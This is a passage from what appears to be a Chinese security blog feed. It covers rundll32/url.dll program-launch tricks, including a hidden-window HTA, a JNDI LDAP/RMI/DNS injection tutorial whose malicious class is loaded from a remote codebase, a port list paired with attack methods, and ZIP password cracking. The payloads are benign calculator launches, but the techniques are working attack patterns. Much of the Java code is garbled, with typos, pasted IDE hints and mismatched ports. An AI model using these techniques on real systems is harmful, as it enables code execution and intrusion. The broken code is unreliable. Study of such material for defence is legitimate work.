title="2、OpenURL的用法"></a>2、OpenURL的用法</h3><p>找到url.dll，包含导出函数OpenURL</p><p>使用IDA查看url.dll的导出函数OpenURL，其中调用了API ShellExecute，如下图</p><p><img src="1663688837471-9adc910f-9ea8-479b-9dd9-469d3a47a026.png" alt="img"></p><p>查看伪代码，如下图<br><img src="1663688854515-b9126ab9-5c4a-486c-9d68-bbaaa53a5703.png" alt="img"></p><p>注意ShellExecute的第二个参数为NULL，第三个参数lpFile对应传入的参数lpFile</p><h3 id="3、API-ShellExecute的用法"><a href="#3、API-ShellExecute的用法" class="headerlink" title="3、API ShellExecute的用法"></a>3、API ShellExecute的用法</h3><p>函数原型与参数定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HINSTANCE <span class="title function_">ShellExecute</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_opt_ HWND    hwnd,</span></span><br><span class="line"><span class="params">  _In_opt_ LPCTSTR lpOperation,  #为NULL时，表示执行默认操作<span class="string">&quot;open&quot;</span></span></span><br><span class="line"><span class="params">  _In_     LPCTSTR lpFile,#要打开的程序或文件路径！！！！</span></span><br><span class="line"><span class="params">  _In_opt_ LPCTSTR lpParameters,</span></span><br><span class="line"><span class="params">  _In_opt_ LPCTSTR lpDirectory,</span></span><br><span class="line"><span class="params">  _In_     INT     nShowCmd</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>也就是说，url.dll中导出函数OpenURL的参数lpFile决定API ShellExecute要打开的程序或文件路径</p><p>综上，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**rundll32.exe url.dll,OpenURL calc.exe**</span><br></pre></td></tr></table></figure><p>实际上的操作为</p><p><code>ShellExecuteA(hwnd, NULL, &quot;calc.exe&quot;, NULL, NULL, nShowCmd);</code>，即执行计算器</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h3 id="1、查找url-dll中其它可供利用的导出函数"><a href="#1、查找url-dll中其它可供利用的导出函数" class="headerlink" title="1、查找url.dll中其它可供利用的导出函数"></a>1、查找url.dll中其它可供利用的导出函数</h3><p>IDA加载url.dll，选择Search - text…，搜索ShellExecuteA，导出函数FileProtocolHandler同样调用API ShellExecute，如下图</p><p><img src="1663689159054-63391993-f46a-43bf-bb3d-fdc78f32e51e.png" alt="img"></p><p><code>**rundll32.exe url.dll,FileProtocolHandler calc.exe**</code> （非管理员运行cmd也可）</p><p><img src="1663689249625-cd4f843e-9ed2-4b1e-b63c-f846a47b0cb4.png" alt="img"></p><h3 id="2、查看其它dll是否包含导出函数OpenURL"><a href="#2、查看其它dll是否包含导出函数OpenURL" class="headerlink" title="2、查看其它dll是否包含导出函数OpenURL"></a>2、查看其它dll是否包含导出函数OpenURL</h3><p> <strong>实现思路：</strong></p><p>枚举<code>%windir%/system32</code>下所有dll的导出函数，筛选出包含导出函数<code>OpenURL</code>的dll</p><p>通过powershell获得dll的导出函数可参考FuzzySecurity的代码，地址如下：</p><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1</a></p><p>在这个代码的基础上，添加枚举dll的功能，分别获得导出函数，进行判断</p><p><strong>实现细节：</strong></p><p>(1)枚举<code>c:\windows\system32</code>下的所有dll：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$DllSearchPath = dir c:\windows\system32\*.dll</span><br><span class="line"><span class="title function_">foreach</span><span class="params">($DllName in $DllSearchPath)</span></span><br><span class="line">&#123;   </span><br><span class="line">    $DllName.Name</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(2)对于<code>c:\windows\system32\auditpolmsg.dll</code>会报错提示输入字符串的格式不正确，所以对语句<code>$OffsetPtr = New-Object System.Intptr -ArgumentList $($HModule.ToInt64() + $ExportRVA)</code>加入try catch判断</p><p>代码位置：</p><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1#L141">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-Exports.ps1#L141</a></p><p>(3)对于<code>c:\windows\system32\avicap.dll</code>会报错，尝试读取或写入受保护的内存，对语句<code>$EXPORT_DIRECTORY_FLAGS =[system.runtime.interopservices.marshal]::PtrToStructure($OffsetPtr,[type]$IMAGE_EXPORT_DIRECTORY)</code>加入try catch判断</p><p>(4)目前代码只支持32位dll的判断</p><p>完整代码可参考：</p><p><strong><a href="https://raw.githubusercontent.com/3gstudent/Writeup/master/Find-OpenURL.ps1">https://raw.githubusercontent.com/3gstudent/Writeup/master/Find-OpenURL.ps1</a></strong></p><p>执行如下图，获得其他两个dll，分别为ieframe.dll和shdocvw.dll</p><p><img src="1663689513860-53d71e0c-5d51-4b90-8cc2-2027e1869024.png" alt="img"></p><p>使用IDA加载ieframe.dll，查看导出函数OpenURL，伪代码如下图</p><p><img src="1663689562925-079c6c39-60ff-4cd4-9ac6-4ba7505f0fc2.png" alt="img"></p><p>由CInternetShortcut可以得知执行的文件为.url文件，编写一个.url文件，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL=c:\windows\system32\calc.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**rundll32.exe ieframe.dll,OpenURL C:\4\calc.url**</span><br></pre></td></tr></table></figure><p>shdocvw.dll也是相同的测试结果</p><h3 id="3、执行的程序类型"><a href="#3、执行的程序类型" class="headerlink" title="3、执行的程序类型"></a>3、执行的程序类型</h3><p>调用API ShellExecute执行程序，不仅支持exe，也同样支持脚本</p><p>例如执行js文件，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WScript.Echo(&quot;1&quot;);</span><br></pre></td></tr></table></figure><p><code>**rundll32.exe url.dll,OpenURL C:\4\echo.js** </code> 执行后弹框</p><p>例如hta文件，内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language=<span class="string">&quot;VBScript&quot;</span>&gt;</span><br><span class="line">Window.ReSizeTo <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">Window.moveTo -<span class="number">2000</span>,-<span class="number">2000</span></span><br><span class="line"><span class="type">Set</span> <span class="variable">objShell</span> <span class="operator">=</span> CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">objShell.Run <span class="string">&quot;calc.exe&quot;</span></span><br><span class="line">self.close</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/HEAD&gt; </span><br><span class="line">&lt;/HTML&gt;</span><br><span class="line">**rundll32.exe url.dll,OpenURLA C:\<span class="number">4</span>\calc.hta**</span><br></pre></td></tr></table></figure><p>例如url文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL=c:\windows\system32\calc.exe</span><br><span class="line">**rundll32.exe ieframe.dll,OpenURL C:\<span class="number">4</span>\calc.url**</span><br></pre></td></tr></table></figure><h3 id="4、更多利用方法"><a href="#4、更多利用方法" class="headerlink" title="4、更多利用方法"></a>4、更多利用方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**rundll32 zipfldr.dll, RouteTheCall calc.exe**</span><br></pre></td></tr></table></figure><p>……</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JNDI</title>
      <link href="/2022/09/20/JNDI/"/>
      <url>/2022/09/20/JNDI/</url>
      
        <content type="html"><![CDATA[<hr><p>JNDI（java Naming and Directory Interface，java命名和目录接口)是一组应用程序接口，访问命名和目录的API，命令服务将名称和对象连接起来，使得我们可以用名称访问对象</p><p>JNDI可以根据名字动态加载数据，支持的服务主要有以下几种：</p><p><strong>RMI：Java远程方法调用。</strong>JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。<br><strong>DNS：域名服务</strong></p><p><strong>LDAP：轻量级目录访问协议</strong></p><p> <strong>CORBA对象服务：公共对象请求代理体系结构</strong></p><table><thead><tr><th></th><th>JDK6</th><th>JDK7</th><th>JDK8</th><th>JDK11</th></tr></thead><tbody><tr><td>RMI可用</td><td>6U132以下</td><td>7U122以下</td><td>8U113以下</td><td>无</td></tr><tr><td>LDAP可用</td><td>6U211以下</td><td>7U201以下</td><td>8U191以下</td><td>11.0.1以下</td></tr></tbody></table><p>Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用，Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能。对象可以通过绑定Reference，存储在Naming或Directory服务下，比如RMI、LDAP等。</p><p>关于ldap注入可利用现场的<a href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></p><h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="1663601482136-d6830c7c-08ed-4030-a214-f3e89bf85348.png" alt="img"></p><h3 id="漏洞端"><a href="#漏洞端" class="headerlink" title="漏洞端"></a>漏洞端</h3><p>一个简单的漏洞端的代码如下，其中必须包含lookup()方法，并且lookup()方法中的url可控，便可产生漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(Stringl] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:7777/Exploitobject&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ldap服务端"><a href="#ldap服务端" class="headerlink" title="ldap服务端"></a>ldap服务端</h3><p>随便一段ldap服务的代码均可</p><h3 id="http端"><a href="#http端" class="headerlink" title="http端"></a>http端</h3><p>一个简单的包含执行恶意代码的http端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit0bject</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command:<span class="string">&quot;fopen -a Calculator&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printstackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/***</span></span><br><span class="line"><span class="comment">other function code block</span></span><br><span class="line"><span class="comment">    ***/</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意点</strong></p><p>1.http端恶意类的类名Exploit0bject需要和ldap服务端转发名一致</p><p>2.static代码块为该类中最先执行的，相当于初始化；其次再是static关键字修饰的变量，最后再是其他代码块</p><p>3.Exploit0bject这个类名会报错（missing package statement ‘xxxx’），一定不能点击添加“set package name to ‘xxxx’”。因为http端与漏洞端是分离的，不在一个包</p><p>4.编译http端恶意类时要与当前漏洞端所对应的Java版本一致，将Exploit0bject.java编译为Exploit0bject.class文件放至http服务下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Exploit0bject.java</span><br></pre></td></tr></table></figure><h2 id="RMI注入"><a href="#RMI注入" class="headerlink" title="RMI注入"></a>RMI注入</h2><h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><p><img src="1663601692286-b576a931-0c3e-4a82-b0a2-252a1e4d659a.png" alt="img"></p><h3 id="漏洞端-1"><a href="#漏洞端-1" class="headerlink" title="漏洞端"></a>漏洞端</h3><p>一个简单的漏洞端的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(Stringl] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:7777/calc&quot;</span>;<span class="comment">//访问该地址下的calc服务</span></span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p><code> String url = &quot;rmi://127.0.0.1:7777/calc&quot;</code>中的calc对应<code>rmi服务端</code>的<code>registry.bind( name: &quot;calc&quot;,wrapper)</code>的calc</p><h3 id="rmi服务端"><a href="#rmi服务端" class="headerlink" title="rmi服务端"></a>rmi服务端</h3><p>一个简单的rmi服务端的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="comment">//攻击者</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry( port:<span class="number">7778</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>( clssName:<span class="string">&quot;test&quot;</span>, factory: <span class="string">&quot;test&quot;</span>,factorylocation:<span class="string">&quot;http://ip:8000/&quot;</span>);</span><br><span class="line">        <span class="type">Referencewrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Referencelrapper</span>(reference);</span><br><span class="line">        registry.bind( name: <span class="string">&quot;calc&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p><code>registry.bind( name: &quot;calc&quot;,wrapper)</code>与<code>Reference reference = new Reference( clssName:&quot;test&quot;, factory: &quot;test&quot;,factorylocation:&quot;http://ip:8000/&quot;)</code>是联系的，意思是将calc服务映射 为http服务端的<a href="http://ip:8000/%E4%B8%AD%E7%9A%84test%E7%B1%BB(clssName)%E4%B8%8B%E7%9A%84test%E6%96%B9%E6%B3%95(factory)">http://ip:8000/中的test类(clssName)下的test方法(factory)</a></p><h3 id="http端-1"><a href="#http端-1" class="headerlink" title="http端"></a>http端</h3><p>一个简单的http服务端的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(command:<span class="string">&quot;open .&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行此段代码之后会打开当前工程所在的文件夹，即使没有开启http端的服务，原因如下：</p><p>开启调试后，跟踪lookup()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#lookup分析</span><br><span class="line">InitialContext#lookup <span class="number">410</span>行</span><br><span class="line">GenericURLContext#lookup <span class="number">96</span>行</span><br><span class="line">Registrycontext#lookup <span class="number">85</span>行</span><br><span class="line">RegistryContext#decode0bject <span class="number">339</span>行</span><br><span class="line">NamingManager#getobjectInstance <span class="number">288</span>行</span><br><span class="line">NamingManager#get0bjectFactoryFromReference <span class="number">137</span>行</span><br></pre></td></tr></table></figure><p>一步一步跟踪到以下方法</p><p><img src="1663602961151-841c9d77-ba67-47c8-888a-e671d6c5f18b.png" alt="img"></p><p>会发现一段代码，意思是先在本地找这个服务</p><p><img src="1663603035990-4a184bea-b8d6-4d7e-9b27-04e0aef3c377.png" alt="img"></p><p>如果没有找到，就使用codebase服务，就是远程加载</p><p><img src="1663603074672-5bd5af60-bd21-4e4d-a9fd-cb6e0e3a1877.png" alt="img"></p><p>综合意思就是，如果在漏洞端本地没有calc这个服务，才会去http服务端执行远程加载，若漏洞端本地有calc这个服务，就不会访问http服务端</p><h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><p>一个简单的漏洞端的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(Stringl] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;dns://x334kr.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用dns比较简单，可以探测漏洞的存在，并且不暴露自己服务器；若dns收到请求，证明漏洞存在</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用端口收集</title>
      <link href="/2022/09/20/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%94%B6%E9%9B%86/"/>
      <url>/2022/09/20/%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="常用端口收集"><a href="#常用端口收集" class="headerlink" title="常用端口收集"></a>常用端口收集</h1><h1 id="web网站"><a href="#web网站" class="headerlink" title="web网站"></a>web网站</h1><p>80 web </p><p>TCP&#x2F;143   IMAP: 可明文可密文   爆破</p><p>UDP&#x2F;161   SNMP:明文  爆破、弱口令、搜集目标内网信息</p><p>TCP&#x2F;389   LDAP:轻型目录访问协议   Ldap注入、匿名访问、弱口令</p><p>TCP&#x2F;512、513、514   Linux Rexec   爆破、Rlogin登录</p><p>TCP&#x2F;1352   Loutus Domino邮件服务   弱口令、信息泄漏、爆破</p><p>TCP&#x2F;1500   ISPManager主机管理面板   弱口令、爆破</p><p>TCP&#x2F;1723   PPTP   爆破</p><p>TCP&#x2F;2061、2604   Zebra路由   弱口令</p><p>TCP&#x2F;3128   Squid代理服务   弱口令</p><p>TCP&#x2F;2082、2083   cPanel主机管理面板登录   弱口令</p><p>TCP&#x2F;2181   Zookeeper服务   未授权访问</p><p>TCP&#x2F;3312、3313   Kangle主机管理登录   弱口令</p><p>TCP&#x2F;4848   GlassFish控制台   弱口令</p><p>TCP&#x2F;8000   Ajenti主机控制面板   弱口令</p><p>TCP&#x2F;8080~8089   Jenkins、 Jboos、Resin、Jetty    反序列化、控制台弱口令</p><p>TCP&#x2F;8443   Plesk主机控制面板   弱口令</p><p>TCP&#x2F;9080、9081、9090   WebSphere控制台  Java反序列化、弱口令</p><p>TCP&#x2F;10000   Webmin- Web控制面板   弱口令</p><p>TCP&#x2F;5632   PcAnywhere远程控制软件   代码执行、抓密码</p><p>TCP&#x2F;5900、5901、5902   VNC远程桌面管理工具   爆破</p><p>TCP&#x2F;7788   Kloxo   面板登录</p><p>TCP&#x2F;8069   Zabbix服务   远程执行、SQL注入</p><p>TCP&#x2F;3690   SVN服务   SVN泄漏、未授权访问</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><p>TCP&#x2F;1433   MSSQL数据库   爆破、注入、提权、弱口令</p><p>TCP&#x2F;1521   Oracle数据库   TNS爆破、弱口令、反弹shell、注入</p><p>TCP&#x2F;3306   MySQL数据库   弱口令、爆破、注入、提权</p><p>TCP&#x2F;5000   Sybase&#x2F;DB2数据库   爆破、注入</p><p>TCP&#x2F;5432   PostgreSQL数据库   爆破、注入、弱口令</p><p>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a> </p><p>TCP&#x2F;27017、27018   MongoDB   爆破、未授权访问</p><p>TCP&#x2F;6379   Redis   未授权访问、爆破</p><h1 id="特殊服务类"><a href="#特殊服务类" class="headerlink" title="特殊服务类"></a>特殊服务类</h1><p>443 SSL心脏滴血 </p><p>TCP&#x2F;137·139·445   Samba: Windows系统和Linux系统间文件共享     MSO8067、MS7017、爆破、远程代码执行</p><p>TCP&#x2F;873   Rsync备份服务   匿名访问、文件上传</p><p>TCP&#x2F;1025、111、2049   NFS   权限配置不当</p><p>TCP&#x2F;1194   Open VPN   VPN账号爆破</p><p>2049 通过网络，跨平台实现文件共享 </p><p>4000 腾讯QQ客户端 </p><p>TCP&#x2F;7001、7002   Weblogic控制台   Java反序列化、弱口令</p><p>TCP&#x2F;9200、9300   Elasticsearch   远程执行</p><p>TCP&#x2F;11211   Memcached高速缓存系统   未授权访问</p><p>TCP&#x2F;50000   SAP Management Console   远程执行</p><p>TCP&#x2F;50070、50030   Hadoop   未授权访问</p><h1 id="常用端口类"><a href="#常用端口类" class="headerlink" title="常用端口类"></a>常用端口类</h1><p>TCP&#x2F;20、21   FTP:文件传输协议匿名访问、留后门、暴破</p><p>TCP&#x2F;22   SSH: Linux远程登录、文件传输、SSL加密传输爆破、SSH隧道及内网代理转发、文件传输   </p><p>TCP&#x2F;23   Telnet:远程登录(在本地主机上使用此端口与远程服务器的22&#x2F;3389端口连接） 爆破、嗅探、弱口令</p><p>TCP&#x2F;25   SMTP:简单邮件传输   枚举邮箱用户、邮件伪造</p><p>UDP&#x2F;53   DNS:域名解析   DNS劫持,域传送漏洞、缓存投毒、欺骗</p><p>UDP&#x2F;69   TFTP:简单文件传输协议   匿名访问、爆破、嗅探</p><p>TCP&#x2F;110   POP3邮局协议   爆破、嗅探</p><p>445   SMB 弱口令扫描 </p><p>2601,2604 zebra 路由默认密码zebra </p><p>TCP&#x2F;3389   Windows RDP远程桌面   Shift后门、爆破、MS2020</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2022/09/20/%E5%B8%B8%E8%A7%81%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/"/>
      <url>/2022/09/20/%E5%B8%B8%E8%A7%81%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8A%A0%E5%AF%86%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="属性隐藏"><a href="#属性隐藏" class="headerlink" title="属性隐藏"></a>属性隐藏</h2><p>就是在属性的注释里有密码<br> <img src="1663687067781-052d579c-3ced-4b7e-a2dc-694b70763602.png" alt="img"></p><h2 id="看二进制"><a href="#看二进制" class="headerlink" title="看二进制"></a>看二进制</h2><p>在winhex里搜索字符pass 、 key 等，查看是否有含有压缩包密码</p><h2 id="ZIP伪加密"><a href="#ZIP伪加密" class="headerlink" title="ZIP伪加密"></a>ZIP伪加密</h2><h3 id="ZIP文件组成"><a href="#ZIP文件组成" class="headerlink" title="ZIP文件组成"></a>ZIP文件组成</h3><ul><li>压缩源文件数据区</li><li>压缩源文件目录区</li><li>压缩源文件目录结束标志。</li></ul><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h3><ul><li>在文件头的加密标志位做修改</li><li>打开文件时识被别为加密压缩包</li></ul><p>具体如下：</p><ul><li>压缩源文件数据区<br>50 4B 03 04 是头文件的标志 （0x04034b50）<br>00 00 全局方式标记（判断有无加密的重要标志）</li><li>压缩文件目录区<br>50 4B 01 02 目录中文件头标志（0x02014b50）<br>00 00 全局方式标记（有无加密的重要标志，更改这里就可以进行伪加密了，改为 09 00 打开就会提示有密码了）</li><li>压缩源文件目录结束标志<br>50 4B 05 06 目录结束标记</li></ul><h3 id="辨别真假加密"><a href="#辨别真假加密" class="headerlink" title="辨别真假加密"></a>辨别真假加密</h3><ul><li>无加密<br>压缩源文件数据区的全局加密应当为 00 00<br>且压缩源文件目录区的全局方式标记应当为00 00</li><li>假加密<br>压缩源文件数据区的全局加密应当为 00 00<br>且压缩文件目录区的全局方式标记应当为 09 00</li><li>真加密<br>压缩源文件数据区的全局加密应当为 09 00<br>且压缩源文件目录区的全局方式应当为 09 00</li></ul><h3 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h3><ul><li>winrar修复功能</li><li>winhex打开修改标志位</li></ul><h2 id="暴力遍历"><a href="#暴力遍历" class="headerlink" title="暴力遍历"></a>暴力遍历</h2><p>Windows   ARCHPR</p><p><img src="1663687196730-2fa2d9f9-34d6-4e19-acaa-94f76daaf589.png" alt="img"></p><h2 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h2><p>已知zip中的一个文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时<br>因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥<br>用ARCHPR或者AZPR进行明文攻击</p><p><img src="1663687257729-75139b3d-56e2-489d-99a1-039eaa8bf30e.png" alt="img"></p><p>过程</p><ul><li>flag.txt是加密压缩包里的flag.txt的明文，一般是对比CRC是否一样</li><li>将flag.txt压缩成.zip文件</li><li>在软件中填入相应的路径即可开始进行明文攻击</li></ul><p>例题<br>攻防世界 Misc高手进阶区 3分题 